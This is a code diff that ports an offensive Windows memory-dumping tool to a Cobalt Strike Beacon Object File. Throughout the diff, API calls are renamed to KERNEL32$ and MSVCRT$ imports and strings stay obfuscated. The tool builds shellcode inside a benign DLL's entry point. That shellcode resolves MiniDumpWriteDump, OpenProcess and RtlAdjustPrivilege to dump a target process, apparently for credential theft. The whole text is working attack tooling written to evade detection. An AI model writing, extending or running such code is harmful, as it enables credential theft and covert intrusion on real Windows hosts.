@@ -12,6 +12,7 @@
 #include <DbgHelp.h>
 #include <string>
 #include "stringobf.h"
+#include "bofdefs.h"
 
 // Builds a SHELLCODE_PARAMS struct so our payload can be smaller and simpler
 bool InitShellcodeParams(
@@ -20,8 +21,8 @@ bool InitShellcodeParams(
     PCWCHAR pDumpPath
 )
 {
-    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    HMODULE hKernel32 = KERNEL32$GetModuleHandleW(L"kernel32.dll");
+    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
 
     if ((NULL == hKernel32) || (NULL == hNtdll))
     {
@@ -34,25 +35,25 @@ bool InitShellcodeParams(
 
     // User params
     pParams->dwTargetProcessId = dwTargetProcessId;
-    if (wcslen(pDumpPath) >= _countof(pParams->dumpPath))
+    if (MSVCRT$wcslen(pDumpPath) >= _countof(pParams->dumpPath))
     {
         BeaconPrintf(CALLBACK_ERROR, OBF("Dump path too long: %ws"), pDumpPath);
         return false;
     }
-    wcsncpy(pParams->dumpPath, pDumpPath, _countof(pParams->dumpPath));
+    MSVCRT$wcsncpy(pParams->dumpPath, pDumpPath, _countof(pParams->dumpPath));
 
     // Strings (so we don't have to embed them in shellcode)
-    strncpy(pParams->szMiniDumpWriteDump, OBF("MiniDumpWriteDump"), _countof(pParams->szMiniDumpWriteDump));
-    wcsncpy(pParams->szDbgHelpDll, L"Dbghelp.dll", _countof(pParams->szDbgHelpDll));
+    MSVCRT$strncpy(pParams->szMiniDumpWriteDump, OBF("MiniDumpWriteDump"), _countof(pParams->szMiniDumpWriteDump));
+    MSVCRT$wcsncpy(pParams->szDbgHelpDll, L"Dbghelp.dll", _countof(pParams->szDbgHelpDll));
 
     // IAT
     // Target process should already have kernel32 loaded, so we can just pass pointers over
-    pParams->pLoadLibraryW = (LoadLibraryW_t)GetProcAddress(hKernel32, OBF("LoadLibraryW"));
-    pParams->pGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, OBF("GetProcAddress"));
-    pParams->pOpenProcess = (OpenProcess_t)GetProcAddress(hKernel32, OBF("OpenProcess"));
-    pParams->pCreateFileW = (CreateFileW_t)GetProcAddress(hKernel32, OBF("CreateFileW"));
-    pParams->pTerminateProcess = (TerminateProcess_t)GetProcAddress(hKernel32, OBF("TerminateProcess"));
-    pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, OBF("RtlAdjustPrivilege"));    
+    pParams->pLoadLibraryW = (LoadLibraryW_t)KERNEL32$GetProcAddress(hKernel32, OBF("LoadLibraryW"));
+    pParams->pGetProcAddress = (GetProcAddress_t)KERNEL32$GetProcAddress(hKernel32, OBF("GetProcAddress"));
+    pParams->pOpenProcess = (OpenProcess_t)KERNEL32$GetProcAddress(hKernel32, OBF("OpenProcess"));
+    pParams->pCreateFileW = (CreateFileW_t)KERNEL32$GetProcAddress(hKernel32, OBF("CreateFileW"));
+    pParams->pTerminateProcess = (TerminateProcess_t)KERNEL32$GetProcAddress(hKernel32, OBF("TerminateProcess"));
+    pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)KERNEL32$GetProcAddress(hNtdll, OBF("RtlAdjustPrivilege"));    
 
     if (!pParams->pLoadLibraryW || 
         !pParams->pGetProcAddress || 
@@ -84,11 +85,11 @@ bool BuildPayload(
     SIZE_T availableSpace = 0;
 
     // Read entire source file into buffer
-    SetFilePointer(hBenignDll, 0, NULL, SEEK_SET);
-    GetFileSizeEx(hBenignDll, &dllSize);
+    KERNEL32$SetFilePointer(hBenignDll, 0, NULL, SEEK_SET);
+    KERNEL32$GetFileSizeEx(hBenignDll, &dllSize);
     buf.resize(dllSize.QuadPart);
 
-    if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
+    if (!KERNEL32$ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
         (dwBytesRead != dllSize.QuadPart))
     {
         BeaconPrintf(CALLBACK_ERROR, OBF("BuildPayload: ReadFile failed with GLE %u"), GetLastError());
@@ -123,9 +124,9 @@ bool BuildPayload(
     }
 
     // Install SHELLCODE_PARAMS
-    memcpy(((PUCHAR)pEntrypoint) + bytesWritten, &params, sizeof(params));
+    MSVCRT$memcpy(((PUCHAR)pEntrypoint) + bytesWritten, &params, sizeof(params));
 
-    payloadBuffer = std::move(buf);
+    payloadBuffer = buf;
 
     return true;
 }
